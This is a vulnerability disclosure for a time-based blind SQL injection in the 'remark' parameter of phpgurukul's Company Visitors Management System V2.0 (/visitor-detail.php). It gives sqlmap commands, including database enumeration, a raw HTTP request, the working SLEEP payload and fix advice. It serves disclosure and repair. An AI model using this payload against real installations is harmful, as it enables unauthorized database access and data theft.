# phpgurukul Company Visitors Management System Project V2.0 /visitor-detail.php SQL injection

# NAME OF AFFECTED PRODUCT(S)

- Company Visitors Management System

## Vendor Homepage

- https://phpgurukul.com/company-visitor-management-system-using-php-and-mysql/

# AFFECTED AND/OR FIXED VERSION(S)

## submitter

- Rmyxx

## Vulnerable File

- /visitor-detail.php

## VERSION(S)

- V2.0

## Software Link

- https://phpgurukul.com/?sdm_process_download=1&download_id=9602

# PROBLEM TYPE

## Vulnerability Type

- SQL injection

## Root Cause

- A SQL injection vulnerability was identified within the "/visitor-detail.php" file of the "Company Visitors Management System" project. The root cause lies in the fact that attackers can inject malicious code via the parameter "remark". This input is then directly utilized in SQL queries without undergoing proper sanitization or validation processes. As a result, attackers are able to fabricate input values, manipulate SQL queries, and execute unauthorized operations.

## Impact

- Exploiting this SQL injection vulnerability allows attackers to gain unauthorized access to the database, cause sensitive data leakage,  tamper with data, gain complete control over the system, and even  disrupt services. This poses a severe threat to both the security of the system and the continuity of business operations.

# DESCRIPTION

- During the security assessment of "Company Visitors Management System", I detected a critical SQL injection vulnerability in the  "/visitor-detail.php" file. This vulnerability is attributed to the  insufficient validation of user input for the "remark" parameter. This  inadequacy enables attackers to inject malicious SQL queries.  Consequently, attackers can access the database without proper  authorization, modify or delete data, and obtain sensitive information.  Immediate corrective actions are essential to safeguard system security  and uphold data integrity.

# Vulnerability details and POC

## Vulnerability location:

- "remark" parameter

## Payload:

python sqlmap.py -r 1.txt

```
Here are the results of sqlmap：



sqlmap identified the following injection point(s) with a total of 82 HTTP(s) requests:
---
Parameter: remark (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: remark=1' AND (SELECT 6032 FROM (SELECT(SLEEP(5)))hLqu) AND 'aEXs'='aEXs&submit=
---
[12:27:45] [INFO] the back-end DBMS is MySQL
[12:27:45] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
web application technology: Apache 2.4.39, PHP 8.0.2
back-end DBMS: MySQL >= 5.0.12
[12:27:45] [INFO] fetched data logged to text files under 'C:\Users\Rmyxx\AppData\Local\sqlmap\output\cve'
[12:27:45] [WARNING] your sqlmap version is outdated

[*] ending @ 12:27:45 /2025-06-05/

```

​     the following is 1.txt

```
1.txt




POST /cvms/visitor-detail.php?editid=6 HTTP/1.1
Host: cve
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Origin: http://cve
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
Referer: http://cve/cvms/visitor-detail.php?editid=6
Cookie: PHPSESSID=ej2ktjpp7a1uoqlri33h16tfkn
Content-Length: 16

remark=1&submit=
```



## Vulnerability Request Packet

```
POST /cvms/visitor-detail.php?editid=6 HTTP/1.1
Host: cve
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Origin: http://cve
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
Referer: http://cve/cvms/visitor-detail.php?editid=6
Cookie: PHPSESSID=ej2ktjpp7a1uoqlri33h16tfkn
Content-Length: 16

remark=1&submit=
```

​      

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:



```
python sqlmap.py -r 1.txt -p remark
```

![image-20250605123225477](C:\Users\Rmyxx\AppData\Roaming\Typora\typora-user-images\image-20250605123225477.png)

```
python sqlmap.py -r 1.txt -p remark --dbs
```



![image-20250605123157464](C:\Users\Rmyxx\AppData\Roaming\Typora\typora-user-images\image-20250605123157464.png)

# Suggested repair

1. **Employ prepared statements and parameter binding:**
    Prepared statements serve as an effective safeguard against SQL  injection as they segregate SQL code from user input data. When using  prepared statements, user - entered values are treated as mere data and  will not be misconstrued as SQL code.
2. **Conduct input validation and filtering:**
    Rigorously validate and filter user input data to guarantee that it  conforms to the expected format. This helps in blocking malicious input.
3. **Minimize database user permissions:**
    Ensure that the account used to connect to the database has only the  minimum required permissions. Avoid using accounts with elevated  privileges (such as 'root' or 'admin') for day - to - day operations.